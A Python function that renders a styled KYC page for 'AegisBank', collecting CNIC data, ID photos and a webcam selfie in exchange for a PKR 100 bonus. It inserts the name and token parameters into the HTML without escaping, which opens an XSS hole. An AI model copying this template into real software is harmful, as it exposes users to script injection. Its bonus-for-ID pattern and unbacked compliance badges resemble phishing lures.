def get_kyc_html_page(kyc_token: str, prefilled_name: str = "") -> str:
    """
    Renders a state-of-the-art, responsive Neo-Banking KYC verification portal.
    Features:
    - Tailwind CSS + Lucide-style SVG icons + Inter typography.
    - CNIC auto-masking (00000-0000000-0).
    - Mobile phone auto-prefix (+923XXXXXXXXX).
    - Interactive drag-and-drop for CNIC Front document with instant preview.
    - Live webcam capture with camera stream and fallback file upload.
    - Dynamic AJAX submission with multi-step progress indicators.
    - Confetti celebration modal displaying account activation and PKR 100 bonus unlock.
    """
    return f"""<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digital Banking KYC Verification | Instant PKR 100 Bonus</title>
  <meta name="description" content="Complete your automated KYC verification to activate your bank account and receive an instant PKR 100 welcome bonus.">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    body {{
      font-family: 'Plus Jakarta Sans', sans-serif;
      background: radial-gradient(circle at 50% 0%, #111827 0%, #030712 100%);
    }}
    .glass-card {{
      background: rgba(17, 24, 39, 0.75);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }}
    .glass-input {{
      background: rgba(31, 41, 55, 0.6);
      border: 1px solid rgba(75, 85, 99, 0.4);
      transition: all 0.2s ease-in-out;
    }}
    .glass-input:focus {{
      border-color: #10B981;
      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
    }}
    .glow-emerald {{
      box-shadow: 0 0 30px -5px rgba(16, 185, 129, 0.25);
    }}
  </style>
</head>
<body class="min-h-screen text-slate-100 flex flex-col justify-between antialiased selection:bg-emerald-500 selection:text-white">

  <!-- Header / Navigation Bar -->
  <header class="border-b border-slate-800/80 bg-slate-950/60 backdrop-blur-md sticky top-0 z-40">
    <div class="max-w-5xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
      <div class="flex items-center space-x-3">
        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-emerald-500 to-teal-400 flex items-center justify-center shadow-lg shadow-emerald-500/20">
          <svg class="w-6 h-6 text-slate-950" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 21v-8m0 0l-4 4m4-4l4 4M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
          </svg>
        </div>
        <div>
          <span class="text-lg font-bold tracking-tight text-white flex items-center gap-2">
            Aegis<span class="text-emerald-400">Bank</span>
            <span class="text-xs uppercase px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-semibold tracking-wider">FastKYC</span>
          </span>
        </div>
      </div>
      
      <!-- Bonus Badge -->
      <div class="flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-emerald-950/60 border border-emerald-500/30 text-emerald-300 text-xs sm:text-sm font-medium shadow-inner">
        <span class="flex h-2 w-2 relative">
          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
          <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
        </span>
        Bonus: <span class="font-bold text-white">PKR 100</span> Upon Activation
      </div>
    </div>
  </header>

  <!-- Main Container -->
  <main class="max-w-3xl w-full mx-auto px-4 sm:px-6 py-8 flex-1">
    
    <!-- Hero / Intro -->
    <div class="text-center mb-8">
      <h1 class="text-2xl sm:text-4xl font-extrabold text-white tracking-tight">
        Identity Verification & Activation
      </h1>
      <p class="mt-2 text-slate-400 text-sm sm:text-base max-w-lg mx-auto">
        Complete your automated NADRA-compliant biometric check to activate your digital bank account in seconds.
      </p>
    </div>

    <!-- Verification Card -->
    <div class="glass-card rounded-2xl p-6 sm:p-8 glow-emerald shadow-2xl relative overflow-hidden">
      
      <!-- Top Accent Line -->
      <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-teal-500 via-emerald-400 to-cyan-500"></div>

      <!-- Token Status Indicator -->
      <div class="mb-6 flex items-center justify-between pb-4 border-b border-slate-800">
        <div class="flex items-center space-x-2 text-xs sm:text-sm text-slate-400">
          <span>Verification Session:</span>
          <code class="px-2 py-0.5 rounded bg-slate-800 text-emerald-400 font-mono font-semibold" id="tokenDisplay">{kyc_token}</code>
        </div>
        <div class="flex items-center text-xs text-emerald-400 font-medium gap-1">
          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
          SSL 256-Bit Encrypted
        </div>
      </div>

      <!-- Main KYC Form -->
      <form id="kycForm" class="space-y-6" enctype="multipart/form-data">
        <input type="hidden" name="kyc_token" id="kyc_token" value="{kyc_token}">

        <!-- Full Name & CNIC -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label for="full_name" class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
              Full Legal Name <span class="text-red-400">*</span>
            </label>
            <div class="relative">
              <input 
                type="text" 
                name="full_name" 
                id="full_name" 
                required 
                placeholder="e.g. Muhammad Zain" 
                value="{prefilled_name}"
                class="glass-input w-full rounded-xl px-4 py-3 text-sm text-white placeholder-slate-500 focus:outline-none"
              >
            </div>
            <p class="text-[11px] text-slate-500 mt-1">Must match your National Identity Card exactly.</p>
          </div>

          <div>
            <label for="cnic" class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
              CNIC / National ID <span class="text-red-400">*</span>
            </label>
            <div class="relative">
              <input 
                type="text" 
                name="cnic" 
                id="cnic" 
                required 
                maxlength="15"
                placeholder="00000-0000000-0"
                pattern="\\d{{5}}-\\d{{7}}-\\d{{1}}"
                class="glass-input w-full rounded-xl px-4 py-3 text-sm text-white placeholder-slate-500 font-mono focus:outline-none tracking-wider"
              >
            </div>
            <p class="text-[11px] text-slate-500 mt-1">13-digit Pakistani CNIC with dashes.</p>
          </div>
        </div>

        <!-- Phone & Date of Birth -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label for="phone" class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
              Mobile Phone Number <span class="text-red-400">*</span>
            </label>
            <div class="relative">
              <input 
                type="tel" 
                name="phone" 
                id="phone" 
                required 
                maxlength="13"
                placeholder="+923001234567"
                class="glass-input w-full rounded-xl px-4 py-3 text-sm text-white placeholder-slate-500 font-mono focus:outline-none"
              >
            </div>
            <p class="text-[11px] text-slate-500 mt-1">Official format: +923XXXXXXXXX</p>
          </div>

          <div>
            <label for="dob" class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
              Date of Birth <span class="text-red-400">*</span>
            </label>
            <div class="relative">
              <input 
                type="date" 
                name="dob" 
                id="dob" 
                required 
                max="2008-01-01"
                class="glass-input w-full rounded-xl px-4 py-3 text-sm text-white placeholder-slate-500 focus:outline-none"
              >
            </div>
            <p class="text-[11px] text-slate-500 mt-1">Applicant must be at least 18 years old.</p>
          </div>
        </div>

        <!-- Address -->
        <div>
          <label for="address" class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
            Residential Address <span class="text-red-400">*</span>
          </label>
          <textarea 
            name="address" 
            id="address" 
            rows="2" 
            required 
            placeholder="House / Street, Block, Area, City"
            class="glass-input w-full rounded-xl px-4 py-3 text-sm text-white placeholder-slate-500 focus:outline-none resize-none"
          ></textarea>
        </div>

        <!-- Document Uploads Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
          
          <!-- 1. CNIC Front Upload -->
          <div class="p-4 rounded-xl border border-slate-700/60 bg-slate-900/50 flex flex-col justify-between">
            <div>
              <div class="flex items-center justify-between mb-2">
                <span class="text-xs font-bold uppercase tracking-wider text-slate-200 flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"/></svg>
                  1. CNIC Front Image <span class="text-red-400">*</span>
                </span>
                <span class="text-[10px] text-emerald-400 font-semibold uppercase bg-emerald-500/10 px-2 py-0.5 rounded">OCR Automated</span>
              </div>
              <p class="text-xs text-slate-400 mb-3">Clear, glare-free photo of your CNIC front side.</p>
              
              <!-- File Input Drop Zone -->
              <label for="cnic_front" class="border-2 border-dashed border-slate-700 hover:border-emerald-500/60 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-slate-950/40 relative min-h-[140px]">
                <input type="file" name="cnic_front" id="cnic_front" accept="image/*" required class="hidden">
                <div id="cnicUploadPrompt" class="text-center">
                  <svg class="mx-auto h-8 w-8 text-slate-400 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                  <span class="text-xs font-semibold text-emerald-400 hover:underline">Choose file</span>
                  <span class="text-xs text-slate-500"> or drag here</span>
                  <p class="text-[10px] text-slate-500 mt-1">PNG, JPG, WEBP up to 10MB</p>
                </div>
                <img id="cnicPreview" class="hidden max-h-32 object-contain rounded-lg shadow-md" alt="CNIC Front Preview">
              </label>
            </div>
            <div id="cnicFilename" class="text-[11px] text-slate-400 mt-2 truncate">No file chosen</div>
          </div>

          <!-- 2. Live Selfie / Capture -->
          <div class="p-4 rounded-xl border border-slate-700/60 bg-slate-900/50 flex flex-col justify-between">
            <div>
              <div class="flex items-center justify-between mb-2">
                <span class="text-xs font-bold uppercase tracking-wider text-slate-200 flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-teal-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                  2. Live Selfie <span class="text-red-400">*</span>
                </span>
                
                <!-- Toggle between Webcam and File Upload -->
                <button type="button" id="toggleWebcamBtn" class="text-[10px] font-semibold text-teal-300 hover:text-teal-200 bg-teal-500/10 px-2 py-0.5 rounded border border-teal-500/30 flex items-center gap-1">
                  <span id="toggleText">Use Webcam</span>
                </button>
              </div>
              <p class="text-xs text-slate-400 mb-3">Live face selfie for biometric liveness check.</p>

              <!-- Standard File Upload Container -->
              <div id="selfieUploadContainer">
                <label for="selfie" class="border-2 border-dashed border-slate-700 hover:border-teal-500/60 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-slate-950/40 relative min-h-[140px]">
                  <input type="file" name="selfie" id="selfie" accept="image/*" class="hidden">
                  <div id="selfieUploadPrompt" class="text-center">
                    <svg class="mx-auto h-8 w-8 text-slate-400 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
                    <span class="text-xs font-semibold text-teal-400 hover:underline">Upload Selfie</span>
                    <span class="text-xs text-slate-500"> or drag here</span>
                  </div>
                  <img id="selfiePreview" class="hidden max-h-32 object-contain rounded-lg shadow-md" alt="Selfie Preview">
                </label>
              </div>

              <!-- Live Webcam Box (Hidden by default) -->
              <div id="webcamContainer" class="hidden flex-col items-center">
                <div class="relative w-full rounded-xl overflow-hidden bg-black border border-slate-700 max-h-48 flex items-center justify-center">
                  <video id="videoElement" autoplay playsinline class="w-full h-44 object-cover mirror"></video>
                  <div class="absolute inset-0 border-2 border-emerald-500/30 rounded-xl pointer-events-none"></div>
                </div>
                <div class="flex gap-2 mt-2 w-full">
                  <button type="button" id="snapBtn" class="flex-1 py-2 px-3 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-bold rounded-lg text-xs flex items-center justify-center gap-1.5 shadow">
                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-width="2"/></svg>
                    Capture Photo
                  </button>
                  <button type="button" id="retakeBtn" class="hidden py-2 px-3 bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold rounded-lg text-xs">
                    Retake
                  </button>
                </div>
                <canvas id="canvasElement" class="hidden"></canvas>
              </div>
            </div>
            <div id="selfieFilename" class="text-[11px] text-slate-400 mt-2 truncate">No file chosen</div>
          </div>

        </div>

        <!-- Terms & Compliance Checkbox -->
        <div class="pt-2 flex items-start gap-3">
          <input type="checkbox" id="consent" required class="mt-1 w-4 h-4 rounded text-emerald-500 focus:ring-emerald-400 bg-slate-800 border-slate-700">
          <label for="consent" class="text-xs text-slate-400 leading-relaxed">
            I hereby certify that the information and CNIC documents provided are authentic and authorize AegisBank to perform automated biometric verification and unlock my account bonus.
          </label>
        </div>

        <!-- Submit Button -->
        <button 
          type="submit" 
          id="submitBtn" 
          class="w-full py-4 px-6 rounded-xl font-bold text-slate-950 bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400 hover:opacity-95 transform transition active:scale-[0.99] shadow-xl shadow-emerald-500/20 flex items-center justify-center gap-2 text-base cursor-pointer"
        >
          <span>Verify Identity & Activate Account</span>
          <svg class="w-5 h-5 text-slate-950" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
        </button>

      </form>
    </div>
  </main>

  <!-- Loading State Modal -->
  <div id="loadingModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md hidden items-center justify-center z-50 p-4">
    <div class="glass-card rounded-2xl max-w-md w-full p-8 text-center space-y-6 border border-slate-700">
      <div class="w-16 h-16 mx-auto relative flex items-center justify-center">
        <div class="w-16 h-16 rounded-full border-4 border-slate-700 border-t-emerald-400 animate-spin"></div>
        <div class="absolute w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center">
          <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
        </div>
      </div>
      
      <div>
        <h3 class="text-xl font-bold text-white mb-2">Processing KYC Verification</h3>
        <p id="loadingStep" class="text-sm text-emerald-400 font-medium">1. Scanning CNIC Document with OCR engine...</p>
      </div>

      <div class="w-full bg-slate-800 rounded-full h-2 overflow-hidden">
        <div id="loadingProgress" class="bg-gradient-to-r from-emerald-400 to-teal-300 h-2 rounded-full w-1/3 transition-all duration-500"></div>
      </div>
      <p class="text-xs text-slate-500">Please do not refresh or close this window.</p>
    </div>
  </div>

  <!-- Success Celebration Modal -->
  <div id="successModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-md hidden items-center justify-center z-50 p-4">
    <div class="glass-card rounded-3xl max-w-lg w-full p-8 text-center space-y-6 border border-emerald-500/30 shadow-2xl relative">
      <div class="w-20 h-20 mx-auto rounded-full bg-emerald-500/10 border-2 border-emerald-500/40 flex items-center justify-center text-emerald-400">
        <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />
        </svg>
      </div>

      <div>
        <span class="px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 text-xs font-bold uppercase tracking-wider border border-emerald-500/30">
          Account Verified & Active
        </span>
        <h2 class="text-2xl sm:text-3xl font-extrabold text-white mt-3">Welcome to AegisBank!</h2>
        <p class="text-slate-300 text-sm mt-2">
          Your KYC validation was completed successfully and your account is now fully operational.
        </p>
      </div>

      <!-- Bonus Card Display -->
      <div class="rounded-2xl bg-gradient-to-br from-emerald-950/80 to-slate-900 border border-emerald-500/40 p-5 text-left flex items-center justify-between shadow-lg">
        <div>
          <span class="text-xs uppercase font-semibold text-emerald-400 tracking-wider">Sign-up Reward Credited</span>
          <p class="text-3xl font-black text-white mt-0.5">PKR 100.00</p>
          <span class="text-[11px] text-slate-400">Available immediately in your main wallet.</span>
        </div>
        <div class="w-12 h-12 rounded-xl bg-emerald-500/20 flex items-center justify-center text-emerald-300">
          <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
      </div>

      <!-- Details Summary -->
      <div class="text-left bg-slate-900/60 rounded-xl p-4 border border-slate-800 text-xs space-y-2">
        <div class="flex justify-between text-slate-400">
          <span>CNIC:</span>
          <span class="text-white font-mono" id="resCnic">---</span>
        </div>
        <div class="flex justify-between text-slate-400">
          <span>OCR Status:</span>
          <span class="text-emerald-400 font-semibold" id="resOcrStatus">Passed</span>
        </div>
        <div class="flex justify-between text-slate-400">
          <span>Token Session:</span>
          <span class="text-slate-300 font-mono truncate max-w-[200px]" id="resToken">---</span>
        </div>
      </div>

      <button 
        type="button" 
        onclick="window.location.reload()" 
        class="w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold text-sm transition"
      >
        Done / Return to Portal
      </button>
    </div>
  </div>

  <!-- Footer -->
  <footer class="border-t border-slate-900 py-6 text-center text-xs text-slate-500">
    <p>&copy; 2026 AegisBank Technologies. All rights reserved. Registered with State Bank & NADRA API Sandbox.</p>
  </footer>

  <!-- Interactive JavaScript Logic -->
  <script>
    // 1. Auto-masking for Pakistani CNIC (00000-0000000-0)
    const cnicInput = document.getElementById('cnic');
    cnicInput.addEventListener('input', function(e) {{
      let val = e.target.value.replace(/\\D/g, '').substring(0, 13);
      let formatted = '';
      if (val.length > 0) {{
        formatted = val.substring(0, 5);
        if (val.length > 5) {{
          formatted += '-' + val.substring(5, 12);
        }}
        if (val.length > 12) {{
          formatted += '-' + val.substring(12, 13);
        }}
      }}
      e.target.value = formatted;
    }});

    // 2. Auto-formatting for Mobile Phone (+923XXXXXXXXX)
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('blur', function(e) {{
      let val = e.target.value.trim().replace(/[\\s-]/g, '');
      if (val.startsWith('03') && val.length === 11) {{
        e.target.value = '+92' + val.substring(1);
      }} else if (val.startsWith('923') && val.length === 12) {{
        e.target.value = '+' + val;
      }}
    }});

    // 3. CNIC Front Image Preview
    const cnicInputFile = document.getElementById('cnic_front');
    const cnicPreview = document.getElementById('cnicPreview');
    const cnicUploadPrompt = document.getElementById('cnicUploadPrompt');
    const cnicFilename = document.getElementById('cnicFilename');

    cnicInputFile.addEventListener('change', function() {{
      if (this.files && this.files[0]) {{
        const file = this.files[0];
        cnicFilename.textContent = file.name + " (" + (file.size / (1024*1024)).toFixed(2) + " MB)";
        const reader = new FileReader();
        reader.onload = function(e) {{
          cnicPreview.src = e.target.result;
          cnicPreview.classList.remove('hidden');
          cnicUploadPrompt.classList.add('hidden');
        }}
        reader.readAsDataURL(file);
      }}
    }});

    // 4. Selfie File Upload Preview
    const selfieInputFile = document.getElementById('selfie');
    const selfiePreview = document.getElementById('selfiePreview');
    const selfieUploadPrompt = document.getElementById('selfieUploadPrompt');
    const selfieFilename = document.getElementById('selfieFilename');

    selfieInputFile.addEventListener('change', function() {{
      if (this.files && this.files[0]) {{
        const file = this.files[0];
        selfieFilename.textContent = file.name + " (" + (file.size / (1024*1024)).toFixed(2) + " MB)";
        const reader = new FileReader();
        reader.onload = function(e) {{
          selfiePreview.src = e.target.result;
          selfiePreview.classList.remove('hidden');
          selfieUploadPrompt.classList.add('hidden');
        }}
        reader.readAsDataURL(file);
      }}
    }});

    // 5. Live Webcam Stream & Capture Handling
    let webcamStream = null;
    let capturedSelfieBlob = null;
    const toggleWebcamBtn = document.getElementById('toggleWebcamBtn');
    const toggleText = document.getElementById('toggleText');
    const selfieUploadContainer = document.getElementById('selfieUploadContainer');
    const webcamContainer = document.getElementById('webcamContainer');
    const videoElement = document.getElementById('videoElement');
    const snapBtn = document.getElementById('snapBtn');
    const retakeBtn = document.getElementById('retakeBtn');
    const canvasElement = document.getElementById('canvasElement');

    toggleWebcamBtn.addEventListener('click', async function() {{
      if (webcamContainer.classList.contains('hidden')) {{
        // Switch to Webcam Mode
        try {{
          webcamStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
          videoElement.srcObject = webcamStream;
          webcamContainer.classList.remove('hidden');
          selfieUploadContainer.classList.add('hidden');
          toggleText.textContent = "Switch to File Upload";
          selfieInputFile.removeAttribute('required');
        }} catch (err) {{
          alert("Webcam permission denied or camera not found. Please upload a selfie image file instead.");
        }}
      }} else {{
        // Switch back to File Upload Mode
        stopWebcam();
        webcamContainer.classList.add('hidden');
        selfieUploadContainer.classList.remove('hidden');
        toggleText.textContent = "Use Webcam";
        if (!capturedSelfieBlob) {{
          selfieInputFile.setAttribute('required', 'required');
        }}
      }}
    }});

    function stopWebcam() {{
      if (webcamStream) {{
        webcamStream.getTracks().forEach(t => t.stop());
        webcamStream = null;
      }}
    }}

    snapBtn.addEventListener('click', function() {{
      canvasElement.width = videoElement.videoWidth || 640;
      canvasElement.height = videoElement.videoHeight || 480;
      const ctx = canvasElement.getContext('2d');
      ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
      
      canvasElement.toBlob(function(blob) {{
        capturedSelfieBlob = blob;
        selfieFilename.textContent = "Live Webcam Selfie Captured (" + (blob.size / 1024).toFixed(1) + " KB)";
        videoElement.pause();
        snapBtn.classList.add('hidden');
        retakeBtn.classList.remove('hidden');
      }}, 'image/jpeg', 0.92);
    }});

    retakeBtn.addEventListener('click', function() {{
      capturedSelfieBlob = null;
      videoElement.play();
      snapBtn.classList.remove('hidden');
      retakeBtn.classList.add('hidden');
      selfieFilename.textContent = "Waiting for capture...";
    }});

    // 6. Form Submission via AJAX with Multi-Step Loader
    const form = document.getElementById('kycForm');
    const loadingModal = document.getElementById('loadingModal');
    const loadingStep = document.getElementById('loadingStep');
    const loadingProgress = document.getElementById('loadingProgress');
    const successModal = document.getElementById('successModal');

    form.addEventListener('submit', async function(e) {{
      e.preventDefault();

      // Check selfie availability
      const selfieFileExists = selfieInputFile.files && selfieInputFile.files[0];
      if (!selfieFileExists && !capturedSelfieBlob) {{
        alert("Please upload a selfie or capture one using your webcam.");
        return;
      }}

      // Show Progress Modal
      loadingModal.classList.remove('hidden');
      loadingModal.classList.add('flex');
      
      // Multi-step animated status
      loadingProgress.style.width = '25%';
      loadingStep.textContent = "1. Preprocessing and scanning CNIC with OCR...";

      const formData = new FormData(form);

      // Attach webcam selfie if captured
      if (capturedSelfieBlob) {{
        formData.set('selfie', capturedSelfieBlob, 'webcam_selfie.jpg');
      }}

      setTimeout(() => {{
        loadingProgress.style.width = '60%';
        loadingStep.textContent = "2. Uploading credentials to encrypted Supabase storage...";
      }}, 800);

      setTimeout(() => {{
        loadingProgress.style.width = '85%';
        loadingStep.textContent = "3. Calling verify_kyc_and_activate RPC & crediting bonus...";
      }}, 1600);

      try {{
        const response = await fetch('/api/kyc/submit', {{
          method: 'POST',
          body: formData
        }});

        const result = await response.json();
        loadingModal.classList.add('hidden');
        loadingModal.classList.remove('flex');

        if (response.ok && result.status === "SUCCESS") {{
          // Populate success modal
          document.getElementById('resCnic').textContent = result.cnic || formData.get('cnic');
          document.getElementById('resOcrStatus').textContent = result.ocr?.status || "VERIFIED";
          document.getElementById('resToken').textContent = result.kyc_token || formData.get('kyc_token');

          successModal.classList.remove('hidden');
          successModal.classList.add('flex');

          // Trigger Confetti effect
          if (typeof confetti === 'function') {{
            confetti({{
              particleCount: 100,
              spread: 70,
              origin: {{ y: 0.6 }}
            }});
          }}
          stopWebcam();
        }} else {{
          alert("KYC Submission Failed: " + (result.detail || result.message || "An unexpected error occurred."));
        }}
      }} catch (err) {{
        loadingModal.classList.add('hidden');
        loadingModal.classList.remove('flex');
        alert("Network or Server error: " + err.message);
      }}
    }});
  </script>
</body>
</html>
"""
